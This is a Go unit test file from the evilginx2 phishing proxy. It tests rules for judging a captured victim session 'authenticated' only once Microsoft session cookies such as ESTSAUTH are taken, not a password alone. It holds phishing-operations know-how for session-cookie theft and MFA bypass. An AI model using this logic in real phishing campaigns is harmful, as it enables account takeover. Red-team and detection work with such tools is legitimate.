package core

import (
	"regexp"
	"testing"

	"github.com/kgretzky/evilginx2/database"
)

func declaredPL(tokens map[string][]*CookieAuthToken) *Phishlet {
	return &Phishlet{cookieAuthTokens: tokens}
}

func tok(name string) *CookieAuthToken { return &CookieAuthToken{name: name} }

func sessWith(password string, cookies map[string]map[string]*database.CookieToken) *Session {
	if cookies == nil {
		cookies = map[string]map[string]*database.CookieToken{}
	}
	return &Session{Password: password, CookieTokens: cookies}
}

func domain(names ...string) map[string]*database.CookieToken {
	m := map[string]*database.CookieToken{}
	for _, n := range names {
		m[n] = &database.CookieToken{Name: n}
	}
	return m
}

// The rule: usable requires cookie evidence. A submitted password is not enough.
func TestAuthEvidenceRequiresTheSessionCookie(t *testing.T) {
	pl := declaredPL(map[string][]*CookieAuthToken{
		".login.microsoftonline.com": {tok("ESTSAUTH"), tok("ESTSAUTHPERSISTENT")},
	})

	// password submitted, provider confirmed, but only the pre-auth cookies - the
	// exact shape of sessions 63 and 60.
	without := sessWith("hunter2", map[string]map[string]*database.CookieToken{
		".login.microsoftonline.com": domain("buid", "esctx", "fpc", "x-ms-gateway-slice"),
	})
	if ok, reason := (&HttpProxy{}).authEvidence(without, pl); ok {
		t.Errorf("password-only capture must not be authenticated (reason %q)", reason)
	} else if reason == "" {
		t.Error("a refusal must carry a reason")
	}

	// the same session once the session-auth cookie lands
	with := sessWith("hunter2", map[string]map[string]*database.CookieToken{
		".login.microsoftonline.com": domain("buid", "esctx", "fpc", "x-ms-gateway-slice", "ESTSAUTH", "ESTSAUTHPERSISTENT"),
	})
	if ok, reason := (&HttpProxy{}).authEvidence(with, pl); !ok {
		t.Errorf("complete cookie evidence must be authenticated (reason %q)", reason)
	}
}

// Passwordless (SSO) sessions must still reach authenticated, via cookies alone.
func TestAuthEvidencePasswordless(t *testing.T) {
	pl := declaredPL(map[string][]*CookieAuthToken{".x.test": {tok("SSOAUTH")}})
	s := sessWith("", map[string]map[string]*database.CookieToken{".x.test": domain("SSOAUTH")})
	if ok, reason := (&HttpProxy{}).authEvidence(s, pl); !ok {
		t.Errorf("a cookie-complete passwordless session must be authenticated (reason %q)", reason)
	}
}

// A phishlet that declares no auth tokens falls back to credentials + confirmation.
func TestAuthEvidenceNoDeclaredTokens(t *testing.T) {
	pl := declaredPL(nil)
	if ok, _ := (&HttpProxy{}).authEvidence(sessWith("pw", nil), pl); !ok {
		t.Error("no declared tokens + password must be authenticated")
	}
	if ok, _ := (&HttpProxy{}).authEvidence(sessWith("", nil), pl); ok {
		t.Error("no declared tokens and no password must not be authenticated")
	}
}

// Optional tokens are not required (this is what makes the rule workable for
// phishlets that list a cookie Microsoft only sets on some flows).
func TestAuthEvidenceIgnoresOptional(t *testing.T) {
	pl := declaredPL(map[string][]*CookieAuthToken{
		".login.microsoftonline.com": {tok("ESTSAUTH"), {name: "brcap", optional: true}},
	})
	s := sessWith("pw", map[string]map[string]*database.CookieToken{
		".login.microsoftonline.com": domain("ESTSAUTH"),
	})
	if ok, reason := (&HttpProxy{}).authEvidence(s, pl); !ok {
		t.Errorf("optional token must not block authentication (reason %q)", reason)
	}
}

// A brand-new session has seen no declared domain yet (empty missing set), so it
// must not be reported as evidenced - otherwise every session would be promoted
// to authenticated by the first response it serves.
func TestAuthEvidenceRequiresSomethingCaptured(t *testing.T) {
	pl := declaredPL(map[string][]*CookieAuthToken{
		".login.microsoftonline.com": {tok("ESTSAUTH")},
	})
	if ok, reason := (&HttpProxy{}).authEvidence(sessWith("", nil), pl); ok {
		t.Errorf("a session with no cookies must not be evidenced (reason %q)", reason)
	}
	// ...but a captured pre-auth cookie is enough to prove we reached the domain,
	// while ESTSAUTH is still missing.
	s := sessWith("", map[string]map[string]*database.CookieToken{
		".login.microsoftonline.com": domain("buid"),
	})
	if ok, _ := (&HttpProxy{}).authEvidence(s, pl); ok {
		t.Error("pre-auth cookies must not satisfy the rule")
	}
}

// A declared domain the victim never reached is not evidence of absence, and a
// domain declared with a leading dot must match captures stored without it.
func TestMissingTokensDomainNormalisation(t *testing.T) {
	pl := declaredPL(map[string][]*CookieAuthToken{
		".login.microsoftonline.com": {tok("ESTSAUTH")},
		".login.live.com":            {tok("MSPRequ")},
		"login.other.test":           {tok("NOPE")},
	})
	s := sessWith("pw", map[string]map[string]*database.CookieToken{
		"login.microsoftonline.com": domain("ESTSAUTH"), // stored undotted, declared dotted
	})
	missing := s.MissingCookieAuthTokens(pl.cookieAuthTokens)
	if len(missing) != 0 {
		t.Errorf("expected no misses (dotted forms match, unseen domains skipped), got %v", missing)
	}
}

// The missing list must name the absent tokens, for the UI to explain a partial.
func TestMissingTokensReportsNames(t *testing.T) {
	pl := declaredPL(map[string][]*CookieAuthToken{
		".login.microsoftonline.com": {tok("ESTSAUTH"), tok("SignInStateCookie")},
	})
	s := sessWith("pw", map[string]map[string]*database.CookieToken{
		".login.microsoftonline.com": domain("buid"),
	})
	missing := s.MissingCookieAuthTokens(pl.cookieAuthTokens)
	got := missingSummary(missing)
	for _, want := range []string{"ESTSAUTH", "SignInStateCookie"} {
		if !contains(got, want) {
			t.Errorf("missing summary %q does not name %s", got, want)
		}
	}
	if contains(got, "buid") {
		t.Errorf("captured token wrongly reported missing: %q", got)
	}
}

// Regexp-declared tokens keep working.
func TestMissingTokensRegexpDeclared(t *testing.T) {
	re := regexpMustCompile(t, ".*")
	pl := declaredPL(map[string][]*CookieAuthToken{".login.live.com": {{name: ".*", re: re}}})
	if ok, _ := (&HttpProxy{}).authEvidence(sessWith("pw", map[string]map[string]*database.CookieToken{
		".login.live.com": domain("anything"),
	}), pl); !ok {
		t.Error("a regexp token matching any captured cookie must satisfy the requirement")
	}
}

func contains(hay, needle string) bool {
	return len(hay) >= len(needle) && (hay == needle || indexOf(hay, needle) >= 0)
}

func indexOf(h, n string) int {
	for i := 0; i+len(n) <= len(h); i++ {
		if h[i:i+len(n)] == n {
			return i
		}
	}
	return -1
}

func regexpMustCompile(t *testing.T, s string) *regexp.Regexp {
	t.Helper()
	re, err := regexp.Compile(s)
	if err != nil {
		t.Fatal(err)
	}
	return re
}
